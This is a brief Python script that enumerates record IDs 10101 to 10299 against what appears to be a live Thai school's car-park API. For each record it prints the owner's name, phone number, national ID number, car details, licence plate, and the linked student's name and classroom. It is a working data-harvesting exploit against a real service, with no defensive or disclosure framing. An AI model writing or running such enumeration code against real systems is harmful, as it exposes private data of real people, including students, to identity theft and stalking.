import requests

def getdata(id):
    respound = requests.get(f'https://center.cpw.ac.th/api.carpark/home/api?ref_id={id}')
    result = respound.json()
    if result['user']['num'] != 1:
        print('No result')
        return
    print('---------------')
    print('ref_id',result['user']['data']['ref_id'])
    print('ชื่อ',result['user']['data']['cd_title'],result['user']['data']['cd_name'],result['user']['data']['cd_lname'])
    print('เบอร์โทร',result['user']['data']['cd_phone'])
    print('เลขบัตรประชาชน',result['user']['data']['cd_idn'])
    for car in result['car']['data']:
        print('รถยนต์',car['cc_brand'],car['cc_modal'])
        print('สี',car['cc_color'])
        print('ป้ายทะเบียน',car['cc_no'],car['PROVINCE_NAME'])
        print('นักเรียน',car['std_name'],car['std_room'])

for i in range(10101,10300):
    getdata(i)